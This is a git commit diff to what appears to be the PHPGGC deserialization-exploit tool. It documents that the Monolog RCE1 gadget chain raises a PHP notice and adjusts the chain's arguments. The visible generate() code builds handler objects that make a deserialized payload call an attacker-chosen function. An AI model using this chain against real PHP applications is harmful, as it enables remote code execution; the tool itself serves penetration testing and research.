54acf43f587d4a5a4640a456c2fdb0cb73133246
Max Chadwick <mpchadwick@gmail.com>
2018-11-13 22:27:14 -0500

    Document the fact that payload raises a notice

--- gadgetchains/Monolog/RCE/1/chain.php
+++ gadgetchains/Monolog/RCE/1/chain.php
@@ -7,6 +7,11 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
     public $version = '1.18 <= 1.23';
     public $vector = '__destruct';
     public $author = 'cf';
+    public $informations = '
+        Note that this payload triggers a NOTICE (Undefined
+        index: level) which may cause it to fail in some
+        environments.
+    ';
 
     public function generate(array $parameters)
     {
@@ -16,7 +21,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
         return new \Monolog\Handler\SyslogUdpHandler(
             new \Monolog\Handler\BufferHandler(
                 ['current', $function],
-                [$parameter, 'level' => null]
+                [$parameter]
             )
         );
     }
